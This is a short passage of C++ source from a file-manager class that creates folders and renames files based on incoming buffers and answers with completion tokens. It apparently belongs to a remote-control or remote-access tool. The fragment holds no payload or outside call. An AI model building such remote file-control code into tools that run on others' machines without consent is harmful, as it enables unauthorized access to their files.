	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

